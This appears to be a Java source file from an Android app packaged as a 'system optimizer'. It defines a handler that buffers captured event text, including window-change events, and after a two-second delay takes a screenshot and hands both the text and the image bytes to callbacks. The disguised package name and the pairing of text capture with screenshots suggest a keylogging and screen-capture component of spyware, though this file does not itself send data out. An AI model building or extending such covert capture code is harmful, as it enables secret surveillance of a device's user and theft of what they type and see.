package com.system.optimizer.handler;

import android.os.Handler;
import android.os.Looper;

import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;
import java.util.function.Supplier;

/**
 * Unified handler for text events with optional screenshot capture.
 * 
 * Flow:
 * 1. Trigger with text (optional)
 * 2. After delay: capture screenshot
 * 3. Send text message (if provided)
 * 4. When screenshot resolves: send image
 * 
 * For TYPE_WINDOW_STATE_CHANGED (no text), use triggerCaptureOnly() to skip text message.
 */
public class BufferedEventHandler {
    private static final long DELAY_MS = 2000;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Consumer<String> textConsumer;
    private final Supplier<CompletableFuture<byte[]>> screenshotCapture;
    private final Consumer<byte[]> screenshotConsumer;
    private String pendingText = "";
    private final Runnable executeRunnable;

    /**
     * Create a BufferedEventHandler with text and screenshot support.
     * 
     * @param textConsumer Consumer that receives the text message (can be null for screenshot-only)
     * @param screenshotCapture Supplier that returns CompletableFuture with screenshot bytes
     * @param screenshotConsumer Consumer that receives the screenshot bytes
     */
    public BufferedEventHandler(Consumer<String> textConsumer,
                                Supplier<CompletableFuture<byte[]>> screenshotCapture,
                                Consumer<byte[]> screenshotConsumer) {
        this.textConsumer = textConsumer;
        this.screenshotCapture = screenshotCapture;
        this.screenshotConsumer = screenshotConsumer;
        
        this.executeRunnable = () -> {
            String textToSend = null;
            
            // Extract text if available
            synchronized (this) {
                if (!pendingText.isEmpty()) {
                    textToSend = pendingText;
                    pendingText = "";
                }
            }
            
            // Capture screenshot first
            if (screenshotCapture != null && screenshotConsumer != null) {
                CompletableFuture<byte[]> future = screenshotCapture.get();
                if (future != null) {
                    // Send text first (if available), then screenshot when ready
                    if (textToSend != null && textConsumer != null) {
                        textConsumer.accept(textToSend);
                    }
                    
                    future.thenAccept(screenshotConsumer);
                    return;
                }
            }
            
            // No screenshot, just send text
            if (textToSend != null && textConsumer != null) {
                textConsumer.accept(textToSend);
            }
        };
    }

    /**
     * Trigger with text - will send text and capture screenshot.
     */
    public void triggerWithText(String text) {
        synchronized (this) {
            pendingText = text;
        }
        scheduleExecution();
    }

    /**
     * Trigger for window change - capture screenshot only, no text.
     */
    public void triggerCaptureOnly() {
        pendingText = "";  // Clear any pending text
        scheduleExecution();
    }
    
    /**
     * Schedule execution after delay.
     */
    private void scheduleExecution() {
        if (handler != null) {
            handler.removeCallbacks(executeRunnable);
            handler.postDelayed(executeRunnable, DELAY_MS);
        }
    }
}
